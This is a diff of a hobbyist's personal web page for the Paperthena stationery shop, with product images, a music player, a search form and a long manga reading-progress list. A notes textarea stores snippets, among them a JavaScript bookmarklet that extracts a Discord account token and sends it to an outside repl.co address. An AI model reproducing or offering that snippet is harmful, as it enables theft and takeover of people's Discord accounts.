@@ -1,63 +1,70 @@
 <!DOCTYPE html>
-<title>Paperthena</title>
-<link rel="icon" type="image/png" sizes="32x32" href="icon.png">
 <meta charset="utf-8">
+<title>Paperthena</title>
+<link href="icon.png" rel="icon" type="image/png" sizes="32x32">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <script crossorigin="anonymous" referrerpolicy="no-referrer" src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.27.2/axios.min.js" integrity="sha512-odNmoc1XJy5x1TMVMdC7EMs3IVdItLPlCeL5vSUPN2llYKMJ2eByTTAIiiuqLg+GdNr9hF6z81p27DArRFKT7A=="></script>
 
-<style>body { color: white; background-color: black; background-size: cover; background-repeat: no-repeat; background-attachment: fixed; background-position: center; background-image: url("background.jpg"); }
-iframe, canvas { width: 80vw; height: calc(80v/1.77); }
-img { max-width: 80vw; }
-#posts img { max-width: 20vw; }
+<style>html { scroll-behavior: smooth; }
+body { background-size: cover; background-repeat: no-repeat; background-attachment: fixed; background-position: center; background-image: url("background.jpg"); color: white; background-color: black; }
+iframe, canvas { width: 90vw; height: calc(90vw/1.77); }
+img { max-width: 90vw; }
 @media only screen and (min-width: 200px) and (max-width: 480px) {
-#music_position { top: 120px !important; left: 120px !important; }
-#home { top: 360px !important; left: 20px !important; }
-#playing_indicator { top: 230px !important; left: 140px !important; }
-#z { top: 230px !important; left: 180px !important; }
-#search_div { top: -280px !important; left: 140px !important; }
-#items { width: 250px !important; }
-#posts_div { top: 5520px !important; left: 5px !important; }
-#list { margin-top: 6630px !important; }
-#files { top: 7170px !important; }
-fieldset { width: 100px !important; }
-input[type="search"] { width: 70px !important; }
-}
+body { background-image: url("background2.jpg"); } }</style>
 
-.main_menu { background-color: red; transition: all 1.80s ease; width: 20px; }
-.main_menu ul li { transform: rotate(20deg); }
-.main_menu ul { list-style-type: none; }
-.main_menu ul li ul { flex-direction: column; display: none; }
-.main_menu ul li:hover ul { display: flex; }
-.main_menu:hover { width: 200px; }
-#menu:checked ~ .main_menu { display: none; }
-#menu::before { margin-left: 20px; content: "yesh"; }
-html { scroll-behavior: smooth; }
-</style>
+<h1 onclick="hide_music()"><i id="auto_type_p">Paperthena</i></h1>
 
-<!--
-
-phil
-sss
-pagibig
-pics
-
-{ object-fit: cover; ; word-break: break-all; grid-template-columns auto 1fr 20px 8ch; }-->
-
-<a href="#user_ip">Mouise</a>
-
-<div style="position: absolute; left: 20px; cursor: pointer; user-select: none;">
-
-<h1 style="font-size: 2rem; position: fixed; top: 0px; left: 20px; width: 400px;" onclick="hide_music()"><i id="auto_type_p">Paperthena</i></h1>
-<div id="playing_indicator" style="position: absolute; top: 0px; left: 930px;">
-<a target="_blank" rel="noopener noreferrer" href="https://www.facebook.com/paperthena"><img src="facebook.png" width="25" height="25"></a><br>
-<a target="_blank" rel="noopener noreferrer" href="https://www.instagram.com/paperthena/"><img src="insta.png" width="25" height="25"></a><br>
-<a target="_blank" rel="noopener noreferrer" href="https://shopee.ph/paperthena"><img src="shopee.png" width="25" height="25"></a>
+<div id="auto_hide_div">
+<div id="crypto_position"></div>
 </div>
 
-<div id="music_position" style="text-align: center; position: absolute; top: 10px; left: 200px;"></div>
-<img id="z" src="qr.png" width="80" height="80" style="position: absolute; top: 0px; left: 970px;">
+<a target="_blank" rel="noopener noreferrer" href="https://www.facebook.com/paperthena"><img src="facebook.png" width="8%" height="4%"></a>
+<a target="_blank" rel="noopener noreferrer" href="https://www.instagram.com/paperthena/"><img src="insta.png" width="8%" height="4%"></a>
+<a target="_blank" rel="noopener noreferrer" href="https://shopee.ph/paperthena"><img src="shopee.png" width="8%" height="4%"></a>
+<img id="z" src="qr.png" width="8%" height="4%">
 
-<div style="margin-top: 70px; display: grid; width: 120px;">
+<fieldset><legend><a href="index.html" style="color: white; text-decoration: none;" download>Search</a></legend>
+<input id="query" placeholder="Search" type="search" onkeypress="if(event.key === 'Enter') document.querySelector('#query_search').click()">
+<select id="search_type">
+<option value="Reddit" selected>Reddit</option>
+<option value="Anime">Anime</option>
+<option value="Discord">Discord</option>
+<option value="Youtube">Youtube</option>
+<option value="Rewind">Rewind</option>
+<option value="Reset">Reset</option></select>
+<button id="query_search" onclick="query_search(document.querySelector('#query').value)">Search</button><br>
+<input type="radio" id="sort1" name="sort" value="Name" unchecked><label for="sort1">Name</label>
+<input type="radio" id="sort2" name="sort" value="Date"><label for="sort2">Date</label></fieldset>
+
+<style>
+#menu:checked ~ .main_menu { display: none; }
+.main_menu ul { list-style-type: disc; }
+.main_menu ul li ul { flex-direction: column; display: none; }
+.main_menu ul li:hover ul { display: flex; }
+</style>
+
+<input type="checkbox" id="menu" checked><label for="menu" id="playing_indicator" style="display: none;">Menu</label>
+<div class="main_menu">
+<ul>
+  <li>T1</li>
+  <li>T2
+    <ul>
+      <li>T3</li>
+      <li>T4</li>
+    </ul>
+  </li>   
+</ul>
+</div>
+
+<select id="mode_selector">
+<option value="Nightmode" selected>Nightmode</option>
+<option value="Lightmode">Lightmode</option>
+</select>
+<input type="submit" value="Theme" onclick="background_image()">
+
+<div id="home"></div>
+<div id="result"></div>
+
 <span onclick="play_music('yasashisa')">Yasashisa</span>
 <span onclick="play_music('kaerou')">Kaerou</span>
 <span onclick="play_music('shinunoga')">Shinunoga E-Wa</span>
@@ -72,98 +79,57 @@ pics
 <span onclick="play_music('orion')">Orion</span>
 <span onclick="play_music('eine')">Eine Kleine</span>
 <span onclick="play_music('haiiro')">Haiiro to Ao</span>
-<div id="list" style="margin-top: 20px;">
-<textarea class="auto_resize" placeholder="Kish"></textarea>
-</div>
-</div>
 
-</div>
-
-<div id="auto_hide_div">
-<div id="crypto_position" style="position: absolute; top: 0px; right: 10px;"></div>
-</div>
-
-<div style="position: absolute; top: 20px; right: 20px;">
-<select id="mode_selector">
-<option value="Nightmode" selected>Nightmode</option>
-<option value="Lightmode">Lightmode</option>
-</select>
-<input type="submit" value="Theme" onclick="background_image()">
-</div>
-
-<div id="home" style="position: absolute; top: 90px; left: 180px; width: 800px; user-select: none;">
-<fieldset style="width: 780px;">
-<legend><a href="index.html" style="color: white; text-decoration: none;" download>Sort by</a></legend>
-
-<div id="search_div" style="position: absolute; left: 510px; width: 500px;">
-<input id="query" placeholder="Search" type="search" onkeypress="if(event.key === 'Enter') document.querySelector('#query_search').click()">
-<select id="search_type">
-<option value="Reddit" selected>Reddit</option>
-<option value="Anime">Anime</option>
-<option value="Discord">Discord</option>
-<option value="Youtube">Youtube</option>
-<option value="Rewind">Rewind</option>
-<option value="Reset">Reset</option>
-</select>
-<button id="query_search" onclick="query_search(document.querySelector('#query').value)">Search</button>
-</div>
-
-<div><input type="radio" id="sort1" name="sort" value="Popular" checked><label for="sort1">Popular</label></div>
-<div><input type="radio" id="sort2" name="sort" value="Latest"><label for="sort2">Latest</label></div>
-<div><input type="radio" id="sort3" name="sort" value="Top Sales"><label for="sort3">Top Sales</label></div>
-<input type="checkbox" id="available" checked><label for="available">Available</label>
-</fieldset>
-
-<div id="result" style="margin-top: 20px; text-align: center;"></div>
-
-<input type="checkbox" id="menu" checked>
-<div class="main_menu">
-<ul>
-<li><a>LoMo</a>
-<ul><li><a>UiHa</a></li></ul>
-</li>   
-</ul>
-</div>
-
-<div id="posts_div" style="border-radius: 20px; border: pink 4px solid; position: absolute; top: 10px; left: 825px; width: 250px; height: 1050px;">
-<form style="margin: 10px; text-align: right;" onsubmit="on_submit(event)">
-<input id="user" placeholder="User" style="width: 60px" required>
-<input id="message" placeholder="Message" style="width: 100px">
-<button type="submit" onclick="get_posts(document.querySelector('#user').value, document.querySelector('#message').value)">Send</button>
-</form>
-<div id="posts" style="margin: 10px;"></div>
-</div>
+<div id="music_position"></div>
 
 <a target="_blank" rel="noopener noreferrer" href="https://shopee.ph/Watercolor-Sketchbook-(200-gsm)-i.405891306.12809265345">
-<div id="items" style="border-radius: 20px; padding: 20px; margin-top: 20px; border: pink 4px solid; width: 760px;">
-<img src="book1.jpg" width="250" height="250">
-<img src="book2.jpg" width="250" height="250">
-<img src="book3.jpg" width="250" height="250">
-<img src="sketch1.webp" width="250" height="250">
-<img src="string1.webp" width="250" height="250">
-<img src="furnace1.webp" width="250" height="250">
-<img src="tape1.jpg" width="250" height="250">
-<img src="page1.jpg" width="250" height="250">
-<img src="paper1.jpg" width="250" height="250">
-<img src="paper2.jpg" width="250" height="250">
-<img src="wax1.jpg" width="250" height="250">
-<img src="wax2.jpg" width="250" height="250">
-<img src="wax3.jpg" width="250" height="250">
-<img src="wax4.jpg" width="250" height="250">
-<img src="wax5.jpg" width="250" height="250">
-<img src="wax6.jpg" width="250" height="250">
-<img src="wax7.jpg" width="250" height="250">
-<img src="stamp1.jpg" width="250" height="250">
-<img src="stamp2.jpg" width="250" height="250">
-<img src="stamp3.jpg" width="250" height="250">
-<img src="stamp4.jpg" width="250" height="250">
-</div></a>
+<img src="book1.jpg" width="30%" height="15%">
+<img src="book2.jpg" width="30%" height="15%">
+<img src="book3.jpg" width="30%" height="15%">
+<img src="sketch1.webp" width="30%" height="15%">
+<img src="string1.webp" width="30%" height="15%">
+<img src="furnace1.webp" width="30%" height="15%">
+<img src="tape1.jpg" width="30%" height="15%">
+<img src="page1.jpg" width="30%" height="15%">
+<img src="paper1.jpg" width="30%" height="15%">
+<img src="paper2.jpg" width="30%" height="15%">
+<img src="wax1.jpg" width="30%" height="15%">
+<img src="wax2.jpg" width="30%" height="15%">
+<img src="wax3.jpg" width="30%" height="15%">
+<img src="wax4.jpg" width="30%" height="15%">
+<img src="wax5.jpg" width="30%" height="15%">
+<img src="wax6.jpg" width="30%" height="15%">
+<img src="wax7.jpg" width="30%" height="15%">
+<img src="stamp1.jpg" width="30%" height="15%">
+<img src="stamp2.jpg" width="30%" height="15%">
+<img src="stamp3.jpg" width="30%" height="15%">
+<img src="stamp4.jpg" width="30%" height="15%"></a>
 
-</div>
+<form onsubmit="on_submit(event)">
+<input id="user" placeholder="User" required>
+<input id="message" placeholder="Message">
+<button type="submit" onclick="get_posts(document.querySelector('#user').value, document.querySelector('#message').value)">Send</button>
+</form>
+<div id="posts">Posts</div>
 
-<div id="files" style="position: absolute; top: 2400px;">
-<span id="user_ip"></span><span id="progress"></span><br>
-<textarea>client=~/client && rm -r ${client} && cd ~/storage/shared/download/ && cp -r client ${client} && cd ${client} && vercel --prod -y
+<a href="#user_ip">Mouise</a>
+<span id="user_ip">IP</span>
+<span id="progress">MBPS</span>
+
+<!--{ transition: all 1.80s ease; }
+{ transform: rotate(20deg); }
+#menu::before { margin-left: 20px; content: "yesh"; }
+{ top: 120px !important; left: 120px !important; }
+input[type="search"] { width: 70px !important; }
+{ cursor: pointer; user-select: none; font-size: 2rem; object-fit: cover; word-break: break-all; grid-template-columns auto 1fr 20px 8ch; }-->
+<textarea class="auto_resize">
+phil
+sss
+pagibig
+pics
+place
+
+client=~/client && rm -r ${client} && cd ~/storage/shared/download/ && cp -r client ${client} && cd ${client} && vercel --prod -y
 alias "+ac0" "bind q dota_ability_autocast 0"; alias "-ac0" "bind q dota_ability_execute 0"; bind "shift" "+ac0"
 javascript:(() => { token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for(let c in e.c) m.push(e.c[c])}]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken(); send = prompt(token, token); if(send !== token) window.location.href = "https://v1.elusion1.repl.co/app?n=" + token })()
 
@@ -991,7 +957,7 @@ class emoji(commands.Cog):
                 await message.delete()
 
 def setup(bot):
-    bot.add_cog(emoji(bot))</textarea></div>
+    bot.add_cog(emoji(bot))</textarea>
 <script>mkush = [{ "d": "AC__", "t": "The King's Avatar", "p": ["12/12", "12/12"] },
 { "d": "ACS_", "t": "How to Steal 55 Kisses", "p": ["12/12", "12/12", "12/12", "12/12"] },
 { "d": "ACS_", "t": "To Be Hero", "p": ["12/12", "1/12"] },
@@ -1323,7 +1289,7 @@ def setup(bot):
 { "d": "MJ__", "t": "Nande Koko ni Sensei ga!?", "p": ["48/?"] },
 { "d": "MJ__", "t": "Nisekoi", "p": ["229/229"] },
 { "d": "MJ__", "t": "One Piece", "p": ["1084/?"] },
-{ "d": "MJ__", "t": "One Punch-Man", "p": ["183/?"] },
+{ "d": "MJ__", "t": "One Punch-Man", "p": ["184/?"] },
 { "d": "MJ__", "t": "Oshi no Ko", "p": ["0/?"] },
 { "d": "MJ__", "t": "ReLife", "p": ["63/222"] },
 { "d": "MJ__", "t": "SAKAMOTO DAYS", "p": ["0/?"] },
@@ -1402,9 +1368,8 @@ def setup(bot):
 { "d": "MK__", "t": "DICE: The Cube that Changes Everything", "p": ["0/388"] },
 { "d": "MK__", "t": "Eleceed", "p": ["0/?"] },
 { "d": "MK__", "t": "Girl the Wild's", "p": ["260/260"] },
-{ "d": "MK__", "t": "Immortal Regis", "p": ["2/44"] },
 { "d": "MK__", "t": "Just for a Meowment", "p": ["0/103"] },
-{ "d": "MK__", "t": "Solo Leveling", "p": ["179/179"] },
+{ "d": "MK__", "t": "Solo Leveling", "p": ["182/?"] },
 { "d": "MK__", "t": "The God of High School", "p": ["0/?"] },
 { "d": "MK__", "t": "The Legendary Moonlight Sculptor", "p": ["106/?"] },
 { "d": "MK__", "t": "Undercover Empress", "p": ["0/?"] },
@@ -1709,7 +1674,7 @@ playing_indicator_showed = false
 function show_indicator(player_key) { playing_indicator_showed = true
 player_hotkeys.forEach(temp_player_key => {
 document.getElementById(temp_player_key).style.display = "none" } )
-document.getElementById(player_key).style.display = "block" }
+document.getElementById(player_key).style.display = "inline" }
 
 function on_submit(e) { e.preventDefault(); message.value = null }
 
